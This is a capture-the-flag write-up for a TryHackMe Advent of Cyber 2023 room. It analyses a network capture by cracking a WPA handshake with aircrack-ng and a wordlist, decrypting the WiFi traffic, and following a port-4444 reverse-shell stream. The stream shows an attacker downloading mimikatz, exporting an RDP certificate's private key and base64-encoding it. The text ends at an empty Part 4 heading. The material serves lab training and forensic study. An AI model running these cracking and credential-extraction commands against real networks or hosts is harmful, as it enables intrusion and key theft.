# The Return of the Yeti #
## The Yeti needs a plan for 2023. Help him out! ##

>Christmas 2023 is already just around the corner. The Bandit Yeti has been sleeping for most of the year to prepare to hack back into the Best Festival Company. Should he have used that time to plan his attack? Probably. But Yetis need a lot of energy, so don't judge!

This room was included as one of the sidequests for the TryHackMe Advent of Cyber 2023.  We are given [a network capture file; `VanSpy.pcapng`](assets/VanSpy.pcapng) and tasked with answering the following questions:

**NOTE :** All answers to the questions are redacted in this document.  If you'd like to know the answers simply got to the [TryHackMe Room](https://tryhackme.com/room/adv3nt0fdbopsjcap) and follow the steps - it's free 😄

>What's the name of the WiFi network in the PCAP?
>
>What's the password to access the WiFi network?
>
>What suspicious tool is used by the attacker to extract a juicy file from the server?
>
>What is the case number assigned by the CyberPolice to the issues reported by McSkidy?
>
>What is the content of the yetikey1.txt file?


## PROCEDURE : ##

We are given a file called [VanSpy.pcapng](assets/VanSpy.pcapng).  PCAPNG (a.k.a. "PCAP Next Generation", "pcap-ng" or ".pcapng") is a file format for network captures that has some improvements over the regular PCAP files we're accustomed to.  Luckily these files can still be handled by [Wireshark](https://www.wireshark.org/) and we can aslo use it [to convert from one fromat to the other]([url](https://www.netresec.com/?page=Blog&month=2012-12&post=HowTo-handle-PcapNG-files)https://www.netresec.com/?page=Blog&month=2012-12&post=HowTo-handle-PcapNG-files).  so we can go ahead and fire-up Wireshark and start examining the newtwork capture we've been given.

### Part 1 - Retrieving the WiFi SSID ###

For the time being we can't see much as most of the traffic is encrypted, but we can start working towards answering the first couple of questions.  [Aircrack-NG](https://www.aircrack-ng.org/) is an excellent tool for this.  it comes pre-installed with Kali Linux distributions and can be used to analyse network captures and extract valuable information about wifi networks.  however Aircrack-NG does not accept PCAPNG files as its input (yet) - so first we need to convert our PCAPNG to a regular PCAP by going to **File** -> **Save As** in Wireshark and selecting ***Modified tcpdump -pcap*** in the **Save as type:** field and saving the file as `VanSpy.pcap`.  Now we can go to ur Linux terminal and examine the PCAP file with Aircrack-NG:
```
$ aircrack-ng VanSpy.pcap  
Reading packets, please wait...
Opening VanSpy.pcap
Read 45243 packets.

   #  BSSID              ESSID                     Encryption

   1  22:C7:12:C7:E2:35  FreeWifiBFC               WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening VanSpy.pcap
Read 45243 packets.

1 potential targets

Please specify a dictionary (option -w).
```

That's great - from just one (very short) command we already have the answer to teh first question.  The name of the WiFi network is **`FreeWifiBFC`**.

#  

### Part 2 - Retrieving the WiFi Password ###

Aircrack-NG also makes answering the next question quite simple for us.  Provided that our capture file contains a succesful WiFi handshake in it, we can use the same tool to brute-force and extract the WiFi password.  We'll need to specify a *wordlist* for this command (i.e. a list of words that the program will attempt to use as passwords).  The most propular wordlist to use for such attacks especially CTF challenges is [`rockyou.txt`](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) which includes some of the most commonly used passwords.
```
$ aircrack-ng VanSpy.pcap -w /usr/share/wordlists/rockyou.txt
```

After just a couple of seconds Aircrack-NG has retrieved the WiFi password for us:
```
                               Aircrack-ng 1.7 

      [00:00:18] 31526/14344392 keys tested (1726.75 k/s) 

      Time left: 2 hours, 18 minutes, 8 seconds                  0.22%

                           KEY FOUND! [ C******** ]


      Master Key     : C4 BB 8C DA 66 C3 72 E6 C2 86 14 84 6E 2B 03 EC 
                       3D 00 2E A7 DE 31 96 BA 86 3A 47 4D 63 3A 48 75 

      Transient Key  : B2 F3 33 91 8A 56 EA 1C 5F BA 8A D7 19 9D A4 62 
                       BA 0A CE C1 46 85 AC 59 4D 38 EA 60 BD D2 88 0B 
                       6A 21 CD 84 B1 A5 07 EA 8F 8B B7 17 B7 DF F4 A2 
                       D8 F3 61 53 32 87 A0 0D 87 78 38 A3 C4 60 E9 B6 

      EAPOL HMAC     : AA CD A8 56 3F 4B AC 08 C8 B1 B8 74 0B 52 2E 6C 
```

So to answer the second question, the WiFi password is **`C********`**

#  
### Part 3 - Decrypting and Analysing WiFi Traffic ###

Now that we have a WiFi password we're going to need to decrypt the WiFi traffic in the network capture to be able to continue our investigation further.  To do this in Wireshark go to **Edit** > **Preferences** > **Protocols** > **IEEE 802.11** and click on the **Edit** button next to *Decryption Keys*.  Click on the `+` sign at the bottom left corner and select *Key type* : `wpa-pwd` and enter the password in the format `password:SSID`.  So in our case this will be `C********:FreeWifiBFC`. Then click on **OK**.

![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/42718960-4238-4466-af1d-6f92b2586ba8)

We can confirm that this has worked because now we are also able to see other traffic apart from 802.11 protocol.  We can now also see things like `ICMP`, `ARP` and more interestingly `TCP` and `TLSv1.2`.

Let's have a closer look at the story that this network capture is telling us.  
1.  **Packets `1` to `331`:** The first packets in the capture are WiFi beacon frames advertising the BSSID and negotiating the handshake (the one we cracked earlier).
2.  **Packets `332` to `335`:** Once the attacker connected to the Wifi we see some ARP traffic as the ARP table is updated with the attacker's MAC and IP addresses.
3.  **Packets `337` to `39981':** Then we immediately see a *Remote Desktop Protocol* (RDP) session as evidenced by the use of TCP Port 3389.  All of this traffic is encrypted over the RDP session (we'll have more fun with this later).
4.  **Packets `39983` to `43952`:** Next we see a lot of traffic from the attacker's port `35827` to multiple different victim port numbers.  Most likely the attacker was performing a port scan here.
5.  **Packets `44021` to `45192`:** Finally we see sustained traffic to/from Port `4444` 

For those who are familiar with cybersecurity and pentesting tools, this rings some alarm bells as port `4444` is an easy-to-remember port number that is very commonly used when establishing reverse shells.  It is helpful to filter for this traffic in Wireshark by using the filter; ``tcp.port == 4444``. Now - ignoring the first thre packets in the resulting list (as these where part of the initial port scan and not the TCP conversation we're interested in), we can right-click on one fo the packets further down the list and select **Follow** > **TCP Stream**.  This gives us a nice cleartext view of what went on in this session:

```
Windows PowerShell running as user Administrator on INTERN-PC
Copyright (C) Microsoft Corporation. All rights reserved.


PS C:\Users\Administrator> PS C:\Users\Administrator> 
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name                                             
----                -------------         ------ ----                                             
d-----       11/23/2023   9:47 PM                .ssh                                             
d-r---        3/17/2021   3:13 PM                3D Objects                                       
d-r---        3/17/2021   3:13 PM                Contacts                                         
d-r---       11/25/2023   2:12 PM                Desktop                                          
d-r---        3/17/2021   3:13 PM                Documents                                        
d-r---       11/24/2023  10:53 PM                Downloads                                        
d-r---        3/17/2021   3:13 PM                Favorites                                        
d-r---        3/17/2021   3:13 PM                Links                                            
d-r---        3/17/2021   3:13 PM                Music                                            
d-r---       11/24/2023  10:44 PM                Pictures                                         
d-r---        3/17/2021   3:13 PM                Saved Games                                      
d-r---        3/17/2021   3:13 PM                Searches                                         
d-r---        3/17/2021   3:13 PM                Videos                                           
-a----       11/25/2023   6:01 AM           8192 psh4444.exe                                      


PS C:\Users\Administrator> whoami
intern-pc\administrator
PS C:\Users\Administrator> wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -O mimi.zip
PS C:\Users\Administrator> Expand-Archive .\mimi.zip
PS C:\Users\Administrator> mv mimi/x64/mimikatz.exe .
PS C:\Users\Administrator> cmd /c mimikatz.exe privilege::debug token::elevate crypto::capi "crypto::certificates /systemstore:LOCAL_MACHINE /store:\`"Remote Desktop\`" /export" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

496	{0;000003e7} 1 D 16529     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;0002bbfa} 2 D 25564822  	INTERN-PC\Administrator	S-1-5-21-1966530601-3185510712-10604624-500	(14g,24p)	Primary
 * Thread Token  : {0;000003e7} 1 D 25609341  	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

mimikatz(commandline) # crypto::capi
Local CryptoAPI RSA CSP patched
Local CryptoAPI DSS CSP patched

mimikatz(commandline) # crypto::certificates /systemstore:LOCAL_MACHINE /store:"Remote Desktop" /export
 * System Store  : 'LOCAL_MACHINE' (0x00020000)
 * Store         : 'Remote Desktop'

 0. INTERN-PC
    Subject  : CN=INTERN-PC
    Issuer   : CN=INTERN-PC
    Serial   : ffb1d93a1df0324cadd5e13f3f9f1b51
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 11/22/2023 9:18:19 PM -> 5/23/2024 9:18:19 PM
    Hash SHA1: a0168513fd57577ecc0204f01441a3bd5401ada7
	Key Container  : TSSecKeySet1
	Provider       : Microsoft Enhanced Cryptographic Provider v1.0
	Provider type  : RSA_FULL (1)
	Type           : AT_KEYEXCHANGE (0x00000001)
	|Provider name : Microsoft Enhanced Cryptographic Provider v1.0
	|Key Container : TSSecKeySet1
	|Unique name   : f686aace6942fb7f7ceb231212eef4a4_c5d2b969-b61a-4159-8f78-6391a1c805db
	|Implementation: CRYPT_IMPL_SOFTWARE ; 
	Algorithm      : CALG_RSA_KEYX
	Key size       : 2048 (0x00000800)
	Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
	Exportable key : NO
	Public export  : OK - 'LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.der'
	Private export : OK - 'LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx'

mimikatz(commandline) # exit
Bye!
PS C:\Users\Administrator> dir

    Directory: C:\Users\Administrator

Mode                LastWriteTime         Length Name                                             
----                -------------         ------ ----                                             
d-----       11/23/2023   9:47 PM                .ssh                                             
d-r---        3/17/2021   3:13 PM                3D Objects                                       
d-r---        3/17/2021   3:13 PM                Contacts                                         
d-r---       11/25/2023   2:12 PM                Desktop                                          
d-r---        3/17/2021   3:13 PM                Documents                                        
d-r---       11/24/2023  10:53 PM                Downloads                                        
d-r---        3/17/2021   3:13 PM                Favorites                                        
d-r---        3/17/2021   3:13 PM                Links                                            
d-----       11/25/2023   2:56 PM                mimi                                             
d-r---        3/17/2021   3:13 PM                Music                                            
d-r---       11/24/2023  10:44 PM                Pictures                                         
d-r---        3/17/2021   3:13 PM                Saved Games                                      
d-r---        3/17/2021   3:13 PM                Searches                                         
d-r---        3/17/2021   3:13 PM                Videos                                           
-a----       11/25/2023   2:56 PM            730 LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.der     
-a----       11/25/2023   2:56 PM           2493 LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx     
-a----       11/25/2023   2:56 PM        1206166 mimi.zip                                         
-a----        9/19/2022   4:44 PM        1355264 mimikatz.exe                                     
-a----       11/25/2023   6:01 AM           8192 psh4444.exe                                      


PS C:\Users\Administrator> [Convert]::ToBase64String([IO.File]::ReadAllBytes("/users/administrator/LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx"))
MIIJuQIB...<R E D A C T E D>....
PS C:\Users\Administrator> exit
```

Now it's easy to see what the attacker was up to as we have the all the Powershell commands and outputs in cleartext infront of us.  Of particular interest is that he downloaded and executed `mimikatz.exe` which is a tool that is used to extract user crredentials from a system's memory.  From the output of `mimikatz.exe` we can also see that he succesfully retrieved a pfx certificate file called `LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx`.   This answers the thrid question of this room.  

The suspicious tool that the attacker used to extract a juicy file from the server was **`mimikatz`**

#  

### Part 4 - Decrypting and Replaying a RDP Session ###


